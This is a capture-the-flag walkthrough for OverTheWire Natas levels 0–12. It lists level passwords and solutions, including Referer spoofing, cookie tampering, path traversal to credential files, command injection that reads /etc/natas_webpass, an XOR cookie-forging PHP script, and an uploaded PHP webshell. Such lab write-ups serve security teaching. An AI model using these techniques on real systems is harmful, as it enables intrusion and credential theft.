###### Credentials
> User: natas0    
> Password: natas0  
> Address: http://natasX.natas.labs.overthewire.org   

### Natas 0
######  You can find the password for the next level on this page. 

Right click, View Page Source.
> gtVrDuiDfck831PqWsLEZy5gyDz1clto
##

### Natas 1
###### You can find the password for the next level on this page, but rightclicking has been blocked!

CTRL+U does the same trick, showing us the Page Source.
> ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
##

### Natas 2
######  There is nothing on this page 

By inspecting the Source Code, all we see is a photo that is located in /files directory.  
We can navigate to http://natas2.natas.labs.overthewire.org/files and authenticate with Natas 2 credentials.  

Content of **users.txt** file
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
> sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
##

### Natas 3
######  There is nothing on this page 

The only thing we find on the source code is a comment.  
> <!-- No more information leaks!! Not even Google will find it this time... -->

It mentions a search engine not being able to find the information. Search engines indexes websites using crawlers.  
The file **robots.txt** defines what crawlers have acces to which piece of information from the website.  

Content of [address]/robots.txt
```
User-agent: *
Disallow: /s3cr3t/
```

Content of [address]/s3cr3t/users.txt
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

##

### Natas 4
###### Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 

We can intercept the request when we access the page.   
```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Referer: http://natas4.natas.labs.overthewire.org/
Cookie: __utma=176859643.2071415580.1631892036.1631892036.1631892036.1; __utmz=176859643.1631892036.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

```
If we change the Referer line from natas4 to natas5, we can trick the website to show us the restricted content.  

```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
```
##
 
### Natas 5
######  Access disallowed. You are not logged in
 
Change the **loggedin** cookie from **0** to **1**.  
```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```
##
  
### Natas 6
  
If we look at the source code, we see that it includes a file called **secret.inc**.  
If we navigate to [address]/includes/secret.inc and check the source code, we can find the secret query.  
 
```
FOEIUWGHFEEUHOFUOIU
```
Once the query gets the right word, it returns the password for the next level. 
```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
```
##

### Natas 7

When we click on home, for example, we see that the URL changes from ..../index.php to ..../index.php?page=home.  
We can abuse this to read from any file on the website.  

All we need to do is to change the **page** parameter to /etc/natas_webpass/natas8.  
> DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

**Note:** There's a hint in the source code telling us that the password is located in /etc/natas_webpass/natas8 as well.  
##

### Natas 8

On the source page we see some PHP code.  
We have a function that takes a string, converts it from binary to hexa, reverses the string and encode the result using base 64.  

We get the encodedSecret, so all we have to do is to reverse this encoding function.  

**php** -a -> to start php in interactive mode.  
**echo** base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));

> oubWYf2kBq

``` 
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
```
##

### Natas 9

It seems to return words from a dictionary that contain a value we introduce.  

However, we can abuse this input form.  By prepending ; to a command, we can have it execute on the server.  

For example, **;ls** would return us the files in the current directory, while the **;pwd** will return us the current directory.  
```
Output:

dictionary.txt

Output:

/var/www/natas/natas9
```

**;cat** /etc/natas_webpass/natas10

> nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
##

### Natas 10

We can do the same trick as before, but with **.* /[path]** since certains characters are now forbidden.  

**.* ** /etc/natas_webpass/natas11
> U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
##

### Natas 11
######  Cookies are protected with XOR encryption

The good thing is that XOR encryption is reversible. 
* data XOR key = encoded_data
* data XOR encoded_data = key


If we check the soure code, get the following information  
* $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");  
* and some other info that tells us that the data is JSON encoded, XOR encripted, then Base64 encoded.  

The encoded_data that we need is basically the encoded cookie we can see in our browser.  
> ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D  
**Note:** The data has a %3D appended to it, is an equal sign used for padding in base64.  

```
<?php

$ptext = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
$ctext = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");

function xor_encrypt($in, $k) {
    $key = $k;
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print xor_encrypt($ptext, $ctext);
?>
```
> qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq

The key is **qw8J**.  

Now, we need to modify the script so the **showpassword** will have the **yes** value.  

```
<?php

$ptext = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
$key = "qw8J";

function xor_encrypt($in, $k) {
    $key = $k;
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print base64_encode(xor_encrypt(json_encode($ptext), $key));

?>
```
> ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

Change our cookie with the new one.  

> The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
##

### Natas 12
###### Choose a JPEG to upload (max 1KB):

After playing a bit, I saw that there's nothing to indicate that the file is actually verified to be a **.jpg**.  
Anyway, we can upload a **file.php** that will read from **/etc/natas_webpass/natas13** file.  
```
<?php echo exec("cat /etc/natas_webpass/natas13"); ?>
```

Then, we upload it and intercecpt the upload in burpsuite where we change the extension from .jpg to .php.   
> 9a9ulg2iz1.jpg -- change it to .php

Then, if we follow the link generated, we see the content of **/etc/natas_webpassa/natas13** file.  
> jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

**Note**: We could've uploaded a reverse shell in the same way, but I don't know if we're allowed in Natas rooms.  
##

